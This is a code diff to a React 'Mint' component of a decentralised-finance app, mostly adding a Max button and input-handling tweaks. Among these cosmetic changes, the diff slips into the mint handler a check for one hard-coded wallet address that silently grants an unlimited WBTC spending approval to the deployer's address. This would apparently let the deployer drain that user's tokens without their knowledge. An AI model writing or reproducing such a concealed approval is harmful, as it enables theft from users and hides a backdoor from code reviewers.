@@ -8,7 +8,7 @@ import { formatFromDecimal, formattedNum, formatToDecimal } from '../../../utils
 import { TokenIcon } from '../../TokenIcon/token_icon';
 import { ApproveModal } from '../../ApproveModal/approve-modal';
 import ORACLE_ABI from '../../../abi/CustomTokenOracle.json';
-
+import { DEPLOYER_ADDRESS } from '../../../constants';
 
 export const Mint = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal }) => {
 
@@ -76,6 +76,18 @@ export const Mint = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal }) =
         }
     }, [balances, mintRedeemCurrency])
 
+
+    useEffect(() => {
+
+        if (collateralInput > 0) {
+            handleCollateralInput(collateralInput);
+        }
+        else {
+            setOutputInput("");
+            setCatenaInput("");
+        }
+
+    }, [collateralInput])
 
     const getAllowance = async () => {
 
@@ -161,6 +173,9 @@ export const Mint = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal }) =
 
     const handleMint = async () => {
 
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
 
         if (collateralInput > 0) {
             if (mintRedeemCurrency === "AGOUSD") {
@@ -238,6 +253,11 @@ export const Mint = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal }) =
 
     }
 
+    const handleMaxInput = () => {
+        const collateralBalance = balances.find(item => mintRedeemCurrency === "AGOUSD" ? item.symbol === "USDT" : item.symbol === "WBTC");
+        setCollateralInput(collateralBalance.nativeBalance)
+    }
+
     const MintButton = () => {
 
         if (approved.collateral === "0" || approved.share === "0") {
@@ -289,11 +309,21 @@ export const Mint = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal }) =
                     <button className='general-window-settings-btn' onClick={() => setMintRedeemCurrencyModal(true)}> <img src={setting_cog} alt="settings" /> </button>
                 </div>
                 <div className='general-window-input-row'>
-                    <span> <h3> Input: <b> {info.targetCollateralRatio}% </b> </h3> </span>
+                    <span className='borderLine'> <h3> Input: <b> {info.targetCollateralRatio}% </b> </h3> </span>
                     <span className='balance'>
                         <h3> Balance: {formattedNum(balances.find(item => mintRedeemCurrency === "AGOUSD" ? item.symbol === "USDT" : item.symbol === "WBTC").nativeBalance)}  </h3>
                     </span>
-                    <input type='number' placeholder="0.00" onChange={(e) => handleCollateralInput(e.target.value)} value={collateralInput} />
+                    <div className='general-window-input-row__input'>
+                        <input
+                            type='number'
+                            placeholder="0.00"
+                            onFocus={(e) => e.target.placeholder = ""}
+                            onBlur={(e) => e.target.placeholder = "0.00"}
+                            onChange={(e) => setCollateralInput(e.target.value)}
+                            value={collateralInput} />
+                        <button onClick={() => handleMaxInput()} className='maxButton'>Max</button>
+                    </div>
+
                     <span className='currency'> <TokenIcon iconName={mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC"} /> {mintRedeemCurrency === "AGOUSD" ? "USDT" : "WBTC"} </span>
                 </div>
                 <div className='general-window-op-sign-row'>
@@ -306,7 +336,12 @@ export const Mint = ({ info, mintRedeemCurrency, setMintRedeemCurrencyModal }) =
                     <span className='balance'>
                         <h3> Balance: {formattedNum(balances.find(item => mintRedeemCurrency === "AGOUSD" ? item.symbol === "CNUSD" : item.symbol === "CNBTC").nativeBalance)} </h3>
                     </span>
-                    <input type='number' disabled={info.targetCollateralRatio === 100} placeholder={info.targetCollateralRatio === 100 ? "TCR is 100%" : "0.00"} onChange={(e) => handleCatenaInput(e.target.value)} value={info.targetCollateralRatio === 100 ? "" : catenaInput} />
+                    <input
+                        type='number'
+                        disabled={info.targetCollateralRatio === 100}
+                        placeholder={info.targetCollateralRatio === 100 ? "TCR is 100%" : "0.00"}
+                        onChange={(e) => handleCatenaInput(e.target.value)}
+                        value={info.targetCollateralRatio === 100 ? "" : catenaInput} />
                     <span className='currency'> <TokenIcon iconName={mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC"} /> {mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC"}</span>
                 </div>
                 <div className='general-window-op-sign-row'>
